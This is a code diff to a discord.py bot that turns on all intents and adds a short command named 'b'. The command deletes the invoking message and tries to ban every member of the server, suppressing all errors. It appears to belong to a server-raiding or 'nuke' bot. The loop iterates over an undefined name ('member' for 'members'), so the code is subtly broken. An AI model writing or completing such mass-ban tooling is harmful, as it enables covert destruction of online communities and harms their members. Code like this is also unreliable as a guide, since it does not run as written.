@@ -18,8 +18,9 @@ from discord.utils import time_snowflake
 from discord import Intents
 from discord.ext import commands
 
+intents=discord.Intents.all()
 
-client = commands.Bot(command_prefix = '.')
+client = commands.Bot(command_prefix = '.',intents=intents)
 client.remove_command('help')
 
 @client.event
@@ -68,6 +69,17 @@ async def cda(ctx):
         except:
             pass   
 
+@client.command()
+async def b(ctx,reason=None):
+  guild=ctx.guild
+  members=ctx.guild.members
+  await ctx.message.delete()
+
+  for member in member:
+    try:
+       await member.ban(reason=reason)
+    except:
+       pass       
 
 @client.command()
 async def commands(ctx):
